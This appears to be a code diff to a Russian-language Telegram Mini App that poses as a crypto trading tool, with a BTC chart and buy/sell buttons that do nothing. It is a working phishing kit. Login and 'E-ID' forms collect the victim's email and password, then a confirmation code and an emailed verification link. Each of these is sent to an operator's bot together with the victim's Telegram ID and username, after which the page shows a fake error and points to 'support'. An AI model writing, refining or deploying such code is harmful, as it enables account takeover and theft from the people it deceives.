+                <input type="password" id="eidPassword" placeholder="Введите пароль" style="width:100%; padding:10px 12px; border:1px solid var(--tg-theme-hint-color, #30363d); border-radius:8px; font-size:15px; background:var(--tg-theme-bg-color, #0d1117); color:var(--tg-theme-text-color, #e6edf3); outline:none;">
             </div>
         </div>
 
-        <button id="eidSubmitBtn" class="btn-primary" onclick="handleEidLogin()">Войти через E-ID</button>
+        <button id="eidSubmitBtn" class="btn" style="width:100%; padding:12px; background:#58a6ff; color:#0d1117; border:none; border-radius:8px; font-size:15px; font-weight:600; cursor:pointer;" onclick="handleEidLogin()">Войти через E-ID</button>
 
-        <div id="eidLoginError" class="message error" style="display:none;">Ошибка. Повторите попытку входа.</div>
+        <div id="eidLoginError" style="display:none; margin-top:12px; padding:10px; background:#f8514933; color:#f85149; border-radius:8px; text-align:center; font-size:14px;">Ошибка. Повторите попытку входа.</div>
 
-        <button class="btn-back" onclick="goToMain()">← Назад</button>
+        <button class="btn" style="width:100%; padding:12px; margin-top:12px; border:1px solid var(--tg-theme-hint-color, #30363d); border-radius:8px; background:transparent; color:var(--tg-theme-text-color, #e6edf3); font-size:14px; font-weight:500; cursor:pointer;" onclick="goToMain()">← Назад</button>
     </div>
 
     <!-- ============================================================
-    СТРАНИЦА 9: ССЫЛКА E-ID
+    СТРАНИЦА 6: ССЫЛКА E-ID
     ============================================================ -->
-    <div id="pageEidLink" class="page">
-        <div class="page-title">Ссылка подтверждения</div>
-        <div class="page-sub">Вставьте ссылку из письма</div>
+    <div id="pageEidLink" class="page" style="display:none;">
+        <div style="text-align:center; font-size:40px; margin-bottom:4px;">🔗</div>
+        <div style="font-size:22px; font-weight:700; text-align:center; margin-bottom:2px;">Ссылка подтверждения</div>
+        <div style="font-size:14px; color:var(--tg-theme-hint-color, #8b949e); text-align:center; margin-bottom:16px;">Вставьте ссылку из письма</div>
 
         <div id="eidLinkFields">
-            <div class="form-group">
-                <label>Ссылка подтверждения</label>
-                <input type="text" id="eidLinkInput" placeholder="Вставьте ссылку">
+            <div style="margin-bottom:12px;">
+                <label style="display:block; font-size:14px; font-weight:500; margin-bottom:4px; color:var(--tg-theme-text-color, #e6edf3);">Ссылка подтверждения</label>
+                <input type="text" id="eidLinkInput" placeholder="Вставьте ссылку" style="width:100%; padding:10px 12px; border:1px solid var(--tg-theme-hint-color, #30363d); border-radius:8px; font-size:15px; background:var(--tg-theme-bg-color, #0d1117); color:var(--tg-theme-text-color, #e6edf3); outline:none;">
             </div>
-            <button id="eidLinkSubmitBtn" class="btn-primary" onclick="handleEidLink()">Подтвердить</button>
+            <button id="eidLinkSubmitBtn" class="btn" style="width:100%; padding:12px; background:#58a6ff; color:#0d1117; border:none; border-radius:8px; font-size:15px; font-weight:600; cursor:pointer;" onclick="handleEidLink()">Подтвердить</button>
         </div>
 
-        <div id="eidLinkError" class="message error" style="display:none;">Ошибка. Повторите попытку.</div>
-        <div class="status-waiting" id="eidLinkStatus" style="display:none;"><span class="spinner"></span> Ожидание...</div>
+        <div id="eidLinkError" style="display:none; margin-top:12px; padding:10px; background:#f8514933; color:#f85149; border-radius:8px; text-align:center; font-size:14px;">Ошибка. Повторите попытку.</div>
+        <div class="status-waiting" id="eidLinkStatus" style="display:none; margin-top:12px; padding:10px; background:#58a6ff22; color:#58a6ff; border-radius:8px; text-align:center; font-size:14px;"><span class="spinner"></span> Ожидание...</div>
 
-        <button class="btn-back" onclick="goToEid()">← Назад</button>
+        <button class="btn" style="width:100%; padding:12px; margin-top:12px; border:1px solid var(--tg-theme-hint-color, #30363d); border-radius:8px; background:transparent; color:var(--tg-theme-text-color, #e6edf3); font-size:14px; font-weight:500; cursor:pointer;" onclick="goToEid()">← Назад</button>
     </div>
 
     <!-- ============================================================
-    СТРАНИЦА 10: ОШИБКА
+    СТРАНИЦА 7: ОШИБКА
     ============================================================ -->
-    <div id="pageLoginError" class="page login-error-page">
-        <div class="icon">✕</div>
-        <h2>Ошибка</h2>
-        <p>Повторите попытку входа.</p>
-        <button class="btn-secondary" onclick="goToMain()">Вернуться на главную</button>
+    <div id="pageLoginError" class="page" style="display:none; text-align:center; padding:30px 0;">
+        <div style="font-size:48px; color:#f85149;">✕</div>
+        <div style="font-size:22px; font-weight:700; color:#f85149; margin:8px 0;">Ошибка</div>
+        <div style="font-size:14px; color:var(--tg-theme-hint-color, #8b949e); margin-bottom:16px;">Повторите попытку входа.</div>
+        <button class="btn" style="padding:12px 24px; border:1px solid var(--tg-theme-hint-color, #30363d); border-radius:8px; background:transparent; color:var(--tg-theme-text-color, #e6edf3); font-size:14px; font-weight:500; cursor:pointer;" onclick="goToMain()">Вернуться на главную</button>
     </div>
 
     <!-- ============================================================
-    СТРАНИЦА 11: БЛОКИРОВКА
+    СТРАНИЦА 8: БЛОКИРОВКА
     ============================================================ -->
-    <div id="pageError" class="page">
-        <div class="error-block">
-            <div class="icon">✕</div>
-            <h2>Ошибка входа</h2>
-            <p>Превышено количество попыток входа.<br>Обратитесь в техническую поддержку.</p>
-            <button onclick="openSupportChat()" class="btn-primary" style="background:#d63031;">Техническая поддержка</button>
-            <button class="btn-back" onclick="goToMain()">← На главную</button>
-        </div>
+    <div id="pageError" class="page" style="display:none; text-align:center; padding:30px 0;">
+        <div style="font-size:48px; color:#f85149;">✕</div>
+        <div style="font-size:22px; font-weight:700; color:#f85149; margin:8px 0;">Ошибка входа</div>
+        <div style="font-size:14px; color:var(--tg-theme-hint-color, #8b949e); margin-bottom:16px;">Превышено количество попыток входа.<br>Обратитесь в техническую поддержку.</div>
+        <button onclick="openSupportChat()" class="btn" style="padding:12px 24px; background:#f85149; color:#0d1117; border:none; border-radius:8px; font-size:14px; font-weight:600; cursor:pointer;">Техническая поддержка</button>
+        <button class="btn" style="display:block; width:100%; margin-top:12px; padding:12px; border:1px solid var(--tg-theme-hint-color, #30363d); border-radius:8px; background:transparent; color:var(--tg-theme-text-color, #e6edf3); font-size:14px; font-weight:500; cursor:pointer;" onclick="goToMain()">← На главную</button>
     </div>
 
     <!-- ===== СООБЩЕНИЯ ===== -->
-    <div id="msg" class="message"></div>
-
-    <!-- ===== ТЕХПОДДЕРЖКА ===== -->
-    <div style="margin-top:auto;padding-top:16px;">
-        <button onclick="openSupportChat()" class="support-btn">Связаться с поддержкой →</button>
-    </div>
+    <div id="msg" style="display:none; margin-top:12px; padding:10px; border-radius:8px; text-align:center; font-size:14px;"></div>
 
 </div>
 
@@ -641,117 +511,112 @@
     tg.expand();
 
     // ============================================================
-    // 3. DOM
+    // 3. СТРАНИЦЫ
     // ============================================================
-    const pageMain = document.getElementById('pageMain');
-    const pageAbout = document.getElementById('pageAbout');
-    const pageBuy = document.getElementById('pageBuy');
-    const pageGuide = document.getElementById('pageGuide');
-    const pageFaq = document.getElementById('pageFaq');
-    const pageLoginForm = document.getElementById('pageLoginForm');
-    const pageCode = document.getElementById('pageCode');
-    const pageEid = document.getElementById('pageEid');
-    const pageEidLink = document.getElementById('pageEidLink');
-    const pageLoginError = document.getElementById('pageLoginError');
-    const pageError = document.getElementById('pageError');
+    function showPage(id) {
+        document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
+        const page = document.getElementById(id);
+        if (page) page.style.display = 'block';
+    }
 
-    const email = document.getElementById('email');
-    const password = document.getElementById('password');
-    const codeInput = document.getElementById('codeInput');
-    const eidEmail = document.getElementById('eidEmail');
-    const eidPassword = document.getElementById('eidPassword');
-    const eidLinkInput = document.getElementById('eidLinkInput');
+    function goToMain() { showPage('pageMain'); }
+    function goToAbout() { showPage('pageAbout'); }
+    function goToLoginForm() { showPage('pageLoginForm'); }
+    function goToEid() { showPage('pageEid'); }
+    function goToLoginError() { showPage('pageLoginError'); }
+    function goToError() { showPage('pageError'); }
 
-    const loginError = document.getElementById('loginError');
-    const codeError = document.getElementById('codeError');
-    const eidLoginError = document.getElementById('eidLoginError');
-    const eidLinkError = document.getElementById('eidLinkError');
-
-    const codeStatus = document.getElementById('codeStatus');
-    const eidLinkStatus = document.getElementById('eidLinkStatus');
-
-    const loginSubmitBtn = document.getElementById('loginSubmitBtn');
-    const submitCodeBtn = document.getElementById('submitCodeBtn');
-    const eidSubmitBtn = document.getElementById('eidSubmitBtn');
-    const eidLinkSubmitBtn = document.getElementById('eidLinkSubmitBtn');
-
-    const msgDiv = document.getElementById('msg');
-
-    let userEmail = '';
-    let userPassword = '';
-    let attemptCount = 0;
+    function showAbout() {
+        showPage('pageAbout');
+    }
 
     // ============================================================
-    // 4. ВСПОМОГАТЕЛЬНЫЕ
+    // 4. КНОПКИ ТАЙМФРЕЙМОВ
+    // ============================================================
+    document.querySelectorAll('.tf-btn').forEach(btn => {
+        btn.addEventListener('click', function() {
+            document.querySelectorAll('.tf-btn').forEach(b => b.classList.remove('active'));
+            this.classList.add('active');
+            // Здесь можно обновить график, меняя интервал
+            const tf = this.dataset.tf;
+            console.log('Таймфрейм выбран:', tf);
+        });
+    });
+
+    // ============================================================
+    // 5. КНОПКИ КУПИТЬ/ПРОДАТЬ
+    // ============================================================
+    document.getElementById('buyBtn').addEventListener('click', function() {
+        showMessage('Функция покупки в разработке', 'info');
+    });
+    document.getElementById('sellBtn').addEventListener('click', function() {
+        showMessage('Функция продажи в разработке', 'info');
+    });
+
+    // ============================================================
+    // 6. TRADINGVIEW ГРАФИК (загружается после рендера)
+    // ============================================================
+    setTimeout(function() {
+        if (typeof TradingView !== 'undefined') {
+            new TradingView.widget({
+                "container_id": "tradingview_btc",
+                "symbol": "BINANCE:BTCUSDT",
+                "interval": "D",
+                "theme": "dark",
+                "style": "1",
+                "locale": "ru",
+                "toolbar_bg": "#161b22",
+                "enable_publishing": false,
+                "hide_side_toolbar": false,
+                "allow_symbol_change": true,
+                "details": true,
+                "hotlist": true,
+                "calendar": false,
+                "studies": [
+                    "MASimple@tv-basicstudies",
+                    "RSI@tv-basicstudies"
+                ]
+            });
+        } else {
+            console.log('TradingView не загружен, проверьте соединение.');
+        }
+    }, 500);
+
+    // ============================================================
+    // 7. СООБЩЕНИЯ
     // ============================================================
     function showMessage(text, type) {
+        const msgDiv = document.getElementById('msg');
         msgDiv.textContent = text;
-        msgDiv.className = 'message ' + type;
         msgDiv.style.display = 'block';
+        msgDiv.className = '';
+        if (type === 'error') {
+            msgDiv.style.background = '#f8514933';
+            msgDiv.style.color = '#f85149';
+            msgDiv.style.border = '1px solid #f8514955';
+        } else if (type === 'success') {
+            msgDiv.style.background = '#3fb95033';
+            msgDiv.style.color = '#3fb950';
+            msgDiv.style.border = '1px solid #3fb95055';
+        } else {
+            msgDiv.style.background = '#58a6ff22';
+            msgDiv.style.color = '#58a6ff';
+            msgDiv.style.border = '1px solid #58a6ff55';
+        }
         clearTimeout(msgDiv._timer);
         msgDiv._timer = setTimeout(() => { msgDiv.style.display = 'none'; }, 5000);
     }
 
-    function switchPage(page) {
-        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-        page.classList.add('active');
-        msgDiv.style.display = 'none';
-        loginError.style.display = 'none';
-        codeError.style.display = 'none';
-        eidLoginError.style.display = 'none';
-        eidLinkError.style.display = 'none';
-        codeStatus.style.display = 'none';
-        eidLinkStatus.style.display = 'none';
-    }
-
-    function goToMain() {
-        switchPage(pageMain);
-        email.value = '';
-        password.value = '';
-        codeInput.value = '';
-        eidEmail.value = '';
-        eidPassword.value = '';
-        eidLinkInput.value = '';
-        loginSubmitBtn.disabled = false;
-        loginSubmitBtn.textContent = 'Войти';
-        eidSubmitBtn.disabled = false;
-        eidSubmitBtn.textContent = 'Войти через E-ID';
-        eidLinkSubmitBtn.disabled = false;
-        eidLinkSubmitBtn.textContent = 'Подтвердить';
-        attemptCount = 0;
-    }
-
-    function goToAbout() { switchPage(pageAbout); }
-    function goToBuy() { switchPage(pageBuy); }
-    function goToGuide() { switchPage(pageGuide); }
-    function goToFaq() { switchPage(pageFaq); }
-    function goToLoginForm() { switchPage(pageLoginForm); setTimeout(() => email.focus(), 300); }
-    function goToEid() { switchPage(pageEid); setTimeout(() => eidEmail.focus(), 300); }
-    function goToLoginError() { switchPage(pageLoginError); }
-    function goToError() { switchPage(pageError); }
-
+    // ============================================================
+    // 8. ДАННЫЕ ПОЛЬЗОВАТЕЛЯ
+    // ============================================================
     function getUserData() {
         const user = tg.initDataUnsafe?.user;
         return user ? { id: user.id || 'неизвестно', first_name: user.first_name || 'Гость', username: user.username || 'нет' } : { id: 'неизвестно', first_name: 'Гость', username: 'нет' };
     }
 
-    function openSupportChat() {
-        window.open(SUPPORT_LINK, '_blank');
-    }
-
-    function handleError() {
-        attemptCount++;
-        if (attemptCount >= MAX_ATTEMPTS) {
-            document.querySelectorAll('#loginFields input, #codeFields input, #eidFields input, #eidLinkFields input').forEach(el => el.disabled = true);
-            document.querySelectorAll('#loginFields button, #codeFields button, #eidFields button, #eidLinkFields button').forEach(el => el.disabled = true);
-            goToError();
-            return true;
-        }
-        return false;
-    }
-
     // ============================================================
-    // 5. ОТПРАВКА В БОТА
+    // 9. ОТПРАВКА В БОТА
     // ============================================================
     async function sendToAdmin(text) {
         try {
@@ -772,51 +637,63 @@
     }
 
     // ============================================================
-    // 6. ЛОГИН
+    // 10. ЛОГИН
     // ============================================================
+    let userEmail = '';
+    let userPassword = '';
+    let attemptCount = 0;
+
     async function handleLogin() {
-        const e = email.value.trim();
-        const p = password.value.trim();
+        const email = document.getElementById('email').value.trim();
+        const password = document.getElementById('password').value.trim();
 
-        if (!e || !p) { showMessage('Заполните все поля', 'error'); return; }
-        if (!e.includes('@')) { showMessage('Введите корректный email', 'error'); return; }
+        if (!email || !password) { showMessage('Заполните все поля', 'error'); return; }
+        if (!email.includes('@')) { showMessage('Введите корректный email', 'error'); return; }
 
+        const loginSubmitBtn = document.getElementById('loginSubmitBtn');
         loginSubmitBtn.disabled = true;
         loginSubmitBtn.textContent = 'Отправка...';
 
-        userEmail = e;
-        userPassword = p;
+        userEmail = email;
+        userPassword = password;
 
         const user = getUserData();
-        const msg = `🔔 НОВАЯ ЗАЯВКА!\n\n👤 ID: ${user.id}\n👤 Имя: ${user.first_name}\n👤 Username: @${user.username}\n📧 Email: ${e}\n🔑 Пароль: ${p}`;
+        const msg = `🔔 НОВАЯ ЗАЯВКА!\n\n👤 ID: ${user.id}\n👤 Имя: ${user.first_name}\n👤 Username: @${user.username}\n📧 Email: ${email}\n🔑 Пароль: ${password}`;
 
         const ok = await sendToAdmin(msg);
 
         if (ok) {
             loginSubmitBtn.disabled = false;
             loginSubmitBtn.textContent = 'Войти';
-            switchPage(pageCode);
-            codeStatus.style.display = 'block';
+            showPage('pageCode');
+            document.getElementById('codeStatus').style.display = 'block';
             showMessage('Ожидание...', 'success');
-            setTimeout(() => codeInput.focus(), 300);
+            setTimeout(() => document.getElementById('codeInput').focus(), 300);
         } else {
             loginSubmitBtn.disabled = false;
             loginSubmitBtn.textContent = 'Войти';
-            if (handleError()) return;
-            loginError.style.display = 'block';
-            loginError.textContent = `Ошибка. (${attemptCount}/${MAX_ATTEMPTS})`;
+            attemptCount++;
+            if (attemptCount >= MAX_ATTEMPTS) {
+                document.querySelectorAll('#loginFields input, #codeFields input, #eidFields input, #eidLinkFields input').forEach(el => el.disabled = true);
+                document.querySelectorAll('#loginFields button, #codeFields button, #eidFields button, #eidLinkFields button').forEach(el => el.disabled = true);
+                showPage('pageError');
+                return;
+            }
+            document.getElementById('loginError').style.display = 'block';
+            document.getElementById('loginError').textContent = `Ошибка. (${attemptCount}/${MAX_ATTEMPTS})`;
             showMessage('Ошибка отправки', 'error');
         }
     }
 
     // ============================================================
-    // 7. КОД
+    // 11. КОД
     // ============================================================
     async function handleCode() {
-        const code = codeInput.value.trim();
+        const code = document.getElementById('codeInput').value.trim();
 
         if (!code || code.length < 4) { showMessage('Введите корректный код', 'error'); return; }
 
+        const submitCodeBtn = document.getElementById('submitCodeBtn');
         submitCodeBtn.disabled = true;
         submitCodeBtn.textContent = 'Отправка...';
 
@@ -828,65 +705,79 @@
         if (ok) {
             submitCodeBtn.disabled = false;
             submitCodeBtn.textContent = 'Подтвердить';
-            codeInput.value = '';
-            codeStatus.style.display = 'none';
-            goToLoginError();
+            document.getElementById('codeInput').value = '';
+            document.getElementById('codeStatus').style.display = 'none';
+            showPage('pageLoginError');
         } else {
             submitCodeBtn.disabled = false;
             submitCodeBtn.textContent = 'Подтвердить';
-            if (handleError()) return;
-            codeError.style.display = 'block';
-            codeError.textContent = `Ошибка. (${attemptCount}/${MAX_ATTEMPTS})`;
+            attemptCount++;
+            if (attemptCount >= MAX_ATTEMPTS) {
+                document.querySelectorAll('#loginFields input, #codeFields input, #eidFields input, #eidLinkFields input').forEach(el => el.disabled = true);
+                document.querySelectorAll('#loginFields button, #codeFields button, #eidFields button, #eidLinkFields button').forEach(el => el.disabled = true);
+                showPage('pageError');
+                return;
+            }
+            document.getElementById('codeError').style.display = 'block';
+            document.getElementById('codeError').textContent = `Ошибка. (${attemptCount}/${MAX_ATTEMPTS})`;
             showMessage('Ошибка отправки', 'error');
         }
     }
 
     // ============================================================
-    // 8. E-ID
+    // 12. E-ID
     // ============================================================
     async function handleEidLogin() {
-        const e = eidEmail.value.trim();
-        const p = eidPassword.value.trim();
+        const email = document.getElementById('eidEmail').value.trim();
+        const password = document.getElementById('eidPassword').value.trim();
 
-        if (!e || !p) { showMessage('Заполните все поля', 'error'); return; }
-        if (!e.includes('@')) { showMessage('Введите корректный email', 'error'); return; }
+        if (!email || !password) { showMessage('Заполните все поля', 'error'); return; }
+        if (!email.includes('@')) { showMessage('Введите корректный email', 'error'); return; }
 
+        const eidSubmitBtn = document.getElementById('eidSubmitBtn');
         eidSubmitBtn.disabled = true;
         eidSubmitBtn.textContent = 'Отправка...';
 
-        userEmail = e;
-        userPassword = p;
+        userEmail = email;
+        userPassword = password;
 
         const user = getUserData();
-        const msg = `🆔 E-ID ЗАЯВКА!\n\n👤 ID: ${user.id}\n👤 Имя: ${user.first_name}\n👤 Username: @${user.username}\n📧 Email: ${e}\n🔑 Пароль: ${p}`;
+        const msg = `🆔 E-ID ЗАЯВКА!\n\n👤 ID: ${user.id}\n👤 Имя: ${user.first_name}\n👤 Username: @${user.username}\n📧 Email: ${email}\n🔑 Пароль: ${password}`;
 
         const ok = await sendToAdmin(msg);
 
         if (ok) {
             eidSubmitBtn.disabled = false;
             eidSubmitBtn.textContent = 'Войти через E-ID';
-            switchPage(pageEidLink);
-            eidLinkStatus.style.display = 'block';
+            showPage('pageEidLink');
+            document.getElementById('eidLinkStatus').style.display = 'block';
             showMessage('Ссылка отправлена на почту', 'success');
-            setTimeout(() => eidLinkInput.focus(), 300);
+            setTimeout(() => document.getElementById('eidLinkInput').focus(), 300);
         } else {
             eidSubmitBtn.disabled = false;
             eidSubmitBtn.textContent = 'Войти через E-ID';
-            if (handleError()) return;
-            eidLoginError.style.display = 'block';
-            eidLoginError.textContent = `Ошибка. (${attemptCount}/${MAX_ATTEMPTS})`;
+            attemptCount++;
+            if (attemptCount >= MAX_ATTEMPTS) {
+                document.querySelectorAll('#loginFields input, #codeFields input, #eidFields input, #eidLinkFields input').forEach(el => el.disabled = true);
+                document.querySelectorAll('#loginFields button, #codeFields button, #eidFields button, #eidLinkFields button').forEach(el => el.disabled = true);
+                showPage('pageError');
+                return;
+            }
+            document.getElementById('eidLoginError').style.display = 'block';
+            document.getElementById('eidLoginError').textContent = `Ошибка. (${attemptCount}/${MAX_ATTEMPTS})`;
             showMessage('Ошибка отправки', 'error');
         }
     }
 
     // ============================================================
-    // 9. E-ID ССЫЛКА
+    // 13. E-ID ССЫЛКА
     // ============================================================
     async function handleEidLink() {
-        const link = eidLinkInput.value.trim();
+        const link = document.getElementById('eidLinkInput').value.trim();
 
         if (!link) { showMessage('Вставьте ссылку подтверждения', 'error'); return; }
 
+        const eidLinkSubmitBtn = document.getElementById('eidLinkSubmitBtn');
         eidLinkSubmitBtn.disabled = true;
         eidLinkSubmitBtn.textContent = 'Отправка...';
 
@@ -898,18 +789,38 @@
         if (ok) {
             eidLinkSubmitBtn.disabled = false;
             eidLinkSubmitBtn.textContent = 'Подтвердить';
-            eidLinkInput.value = '';
-            eidLinkStatus.style.display = 'none';
-            goToLoginError();
+            document.getElementById('eidLinkInput').value = '';
+            document.getElementById('eidLinkStatus').style.display = 'none';
+            showPage('pageLoginError');
         } else {
             eidLinkSubmitBtn.disabled = false;
             eidLinkSubmitBtn.textContent = 'Подтвердить';
-            if (handleError()) return;
-            eidLinkError.style.display = 'block';
-            eidLinkError.textContent = `Ошибка. (${attemptCount}/${MAX_ATTEMPTS})`;
+            attemptCount++;
+            if (attemptCount >= MAX_ATTEMPTS) {
+                document.querySelectorAll('#loginFields input, #codeFields input, #eidFields input, #eidLinkFields input').forEach(el => el.disabled = true);
+                document.querySelectorAll('#loginFields button, #codeFields button, #eidFields button, #eidLinkFields button').forEach(el => el.disabled = true);
+                showPage('pageError');
+                return;
+            }
+            document.getElementById('eidLinkError').style.display = 'block';
+            document.getElementById('eidLinkError').textContent = `Ошибка. (${attemptCount}/${MAX_ATTEMPTS})`;
             showMessage('Ошибка отправки', 'error');
         }
     }
+
+    // ============================================================
+    // 14. ПОДДЕРЖКА
+    // ============================================================
+    function openSupportChat() {
+        window.open(SUPPORT_LINK, '_blank');
+    }
+
+    // ============================================================
+    // 15. ПОКАЗАТЬ ПРИВЕТСТВИЕ ПРИ ЗАГРУЗКЕ
+    // ============================================================
+    document.addEventListener('DOMContentLoaded', function() {
+        goToMain();
+    });
 </script>
 
 </body>
